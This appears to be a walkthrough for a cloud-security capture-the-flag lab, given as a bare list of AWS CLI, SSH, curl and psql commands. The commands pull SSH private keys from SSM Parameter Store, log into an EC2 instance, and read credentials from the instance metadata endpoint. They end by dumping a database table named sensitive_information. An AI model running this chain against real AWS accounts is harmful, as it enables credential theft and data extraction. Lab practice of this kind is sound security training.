`aws ssm describe-parameters --profile scenario6_1_user`

`aws ssm get-parameter --name <private key name> --profile scenario6_1_user`

`echo -e "<private key>" > ec2_ssh_key`

`chmod 400 ec2_ssh_key`

`aws ssm get-parameter --name <public key name> --profile scenario6_1_user`

`echo -e "<public key>" > ec2_ssh_key.pub`

`aws ec2 describe-instances --profile scenario6_1_user`

`ssh -i ec2_ssh_key ubuntu@<instance ip>`

# BRANCH A:

`sudo apt update && sudo apt install awscli -y`

`aws lambda list-functions --region eu-central-1`

`aws rds describe-db-instances --profile scenario6_1_user`

# BRANCH B:

`curl http://169.254.169.254/latest/user-data`

`psql -h <rds db host/ip> -U sc6admin -d SecurityChallenge`

`\d`

`select * from sensitive_information;`